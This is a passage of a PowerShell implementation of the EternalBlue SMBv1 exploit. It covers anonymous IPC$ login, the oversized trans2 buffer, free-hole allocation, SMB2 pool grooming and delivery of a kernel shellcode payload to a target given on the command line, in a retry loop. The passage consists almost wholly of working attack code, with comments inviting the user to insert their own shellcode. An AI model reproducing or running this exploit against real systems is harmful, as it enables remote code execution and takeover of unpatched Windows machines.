    $ipc = "\\"+ $Target + "\IPC$"

     $pkt +=0x04              # Word Count
     $pkt +=0xFF              # AndXCommand: No further commands
     $pkt +=0x00              # Reserved
     $pkt +=0x00,0x00          # AndXOffset
     $pkt +=0x00,0x00          # Flags
     $pkt +=0x01,0x00          # Password Length
     $pkt +=0x1A,0x00          # Byte Count
     $pkt +=0x00              # Password
     $pkt += [system.Text.Encoding]::ASCII.GetBytes($ipc) # \,0xxx.xxx.xxx.xxx\IPC$
     $pkt += 0x00       # null byte after ipc added by kev

     $pkt += 0x3f,0x3f,0x3f,0x3f,0x3f,0x00   # Service


    $len = $pkt.Length - 4
    # netbios[1] =$pkt +=0x00' + struct.pack('>H length)
    $hexlen = [bitconverter]::GetBytes($len)[-2..-4]
    $pkt[1] = $hexlen[0]
    $pkt[2] = $hexlen[1]
    $pkt[3] = $hexlen[2]
    return $pkt

    }



function smb_header($smbheader) {

$parsed_header =@{server_component=$smbheader[0..3];
                  smb_command=$smbheader[4];
                  error_class=$smbheader[5];
                  reserved1=$smbheader[6];
                  error_code=$smbheader[6..7];
                  flags=$smbheader[8];
                  flags2=$smbheader[9..10];
                  process_id_high=$smbheader[11..12];
                  signature=$smbheader[13..21];
                  reserved2=$smbheader[22..23];
                  tree_id=$smbheader[24..25];
                  process_id=$smbheader[26..27];
                  user_id=$smbheader[28..29];
                  multiplex_id=$smbheader[30..31];
                 }
return $parsed_header

}




function smb1_get_response($sock){



    $tcp_response = [Array]::CreateInstance("byte", 1024)
    try{
    $sock.Receive($tcp_response)| out-null

     }
     catch {
      # # Write-Verbose "socket error, exploit may fail "
     }
    $netbios = $tcp_response[0..4]
    $smb_header = $tcp_response[4..36]  # SMB Header: 32 bytes
    $parsed_header = smb_header($smb_header)

    return $tcp_response, $parsed_header

}


function client_negotiate($sock){
$raw_proto = negotiate_proto_request
    $sock.Send($raw_proto) | out-null
    return smb1_get_response($sock)

}

function smb1_anonymous_login($sock){
    $raw_proto = make_smb1_anonymous_login_packet
    $sock.Send($raw_proto) | out-null
   return smb1_get_response($sock)


}

function tree_connect_andx($sock, $Target, $userid){
    $raw_proto = tree_connect_andx_request $Target $userid
    $sock.Send($raw_proto) | out-null
   return smb1_get_response($sock)


}


function smb1_anonymous_connect_ipc($Target)
{
    $client = New-Object System.Net.Sockets.TcpClient($Target,445)

    $sock = $client.Client
    client_negotiate($sock) | Out-Null

    $raw, $smbheader = smb1_anonymous_login $sock

    $raw, $smbheader = tree_connect_andx $sock $Target $smbheader.user_id


    return $smbheader, $sock



}


function smb1_large_buffer($smbheader,$sock){

    $nt_trans_pkt = make_smb1_nt_trans_packet $smbheader.tree_id $smbheader.user_id

    # send NT Trans

    $sock.Send($nt_trans_pkt) | out-null

    $raw, $transheader = smb1_get_response($sock)

    #initial trans2 request
    $trans2_pkt_nulled = make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id "eb_trans2_zero" 0

    #send all but the last packet
    for($i =1; $i -le 14; $i++) {
        $trans2_pkt_nulled += make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id "eb_trans2_buffer" $i

    }

    $trans2_pkt_nulled += make_smb1_echo_packet $smbheader.tree_id  $smbheader.user_id
    $sock.Send($trans2_pkt_nulled) | out-null

    smb1_get_response($sock) | Out-Null

}


function smb1_free_hole($start) {
   $client = New-Object System.Net.Sockets.TcpClient($Target,445)

    $sock = $client.Client
    client_negotiate($sock) | Out-Null
    if($start) {
        $pkt =  make_smb1_free_hole_session_packet (0x07,0xc0) (0x2d,0x01) (0xf0,0xff,0x00,0x00,0x00)
    }
    else {
        $pkt =  make_smb1_free_hole_session_packet (0x07,0x40) (0x2c,0x01) (0xf8,0x87,0x00,0x00,0x00)
    }

    $sock.Send($pkt) | out-null
    smb1_get_response($sock) | Out-Null
    return $sock
}

     function smb2_grooms($Target, $grooms, $payload_hdr_pkt, $groom_socks){


         for($i =0; $i -lt $grooms; $i++)
         {
            $client = New-Object System.Net.Sockets.TcpClient($Target,445)

             $gsock = $client.Client
             $groom_socks += $gsock
             $gsock.Send($payload_hdr_pkt) | out-null

         }
        return $groom_socks
     }




function smb_eternalblue($Target, $grooms, $Shellcode) {


    #replace null bytes with your shellcode
    [Byte[]]  $payload = [Byte[]]($Shellcode)

    $shellcode = make_kernel_user_payload($payload)
    $payload_hdr_pkt = make_smb2_payload_headers_packet
    $payload_body_pkt = make_smb2_payload_body_packet($shellcode)

    # # Write-Verbose "Connecting to target for activities"
     $smbheader, $sock = smb1_anonymous_connect_ipc($Target)
     $sock.ReceiveTimeout =2000
     # # Write-Verbose "Connection established for exploitation."
           # Step 2: Create a large SMB1 buffer
           # # Write-Verbose  "all but last fragment of exploit packet"
     smb1_large_buffer $smbheader $sock
           # Step 3: Groom the pool with payload packets, and open/close SMB1 packets

     # initialize_groom_threads(ip, port, payload, grooms)
     $fhs_sock = smb1_free_hole $true
     $groom_socks =@()
     $groom_socks = smb2_grooms $Target $grooms $payload_hdr_pkt $groom_socks

     $fhf_sock = smb1_free_hole $false

     $fhs_sock.Close() | Out-Null

     $groom_socks = smb2_grooms $Target 6 $payload_hdr_pkt $groom_socks

     $fhf_sock.Close() | out-null

     # # Write-Verbose "Running final exploit packet"

     $final_exploit_pkt =  $trans2_pkt_nulled = make_smb1_trans2_exploit_packet $smbheader.tree_id $smbheader.user_id "eb_trans2_exploit"  15

     try{
     $sock.Send($final_exploit_pkt) | Out-Null
      $raw, $exploit_smb_header = smb1_get_response $sock
      # # Write-Verbose ("SMB code: " + [System.BitConverter]::ToString($exploit_smb_header.error_code))

     }
     catch {
      # # Write-Verbose "socket error, exploit may fail horribly"
     }


      # # Write-Verbose "Send the payload with the grooms"

     foreach ($gsock in $groom_socks)
     {
        $gsock.Send($payload_body_pkt[0..2919]) | out-null
     }
        foreach ($gsock in $groom_socks)
     {
        $gsock.Send($payload_body_pkt[2920..4072]) | out-null
     }
         foreach ($gsock in $groom_socks)
     {
        $gsock.Close() | out-null
     }

     $sock.Close()| out-null
  }




$VerbosePreference = "continue"

for ($i=0; $i -lt $MaxAttempts; $i++) {
    $grooms = $InitialGrooms + $GROOM_DELTA*$i
    smb_eternalblue $Target $grooms $Shellcode
}



}
$Target=$args[0]
Myfun $Target
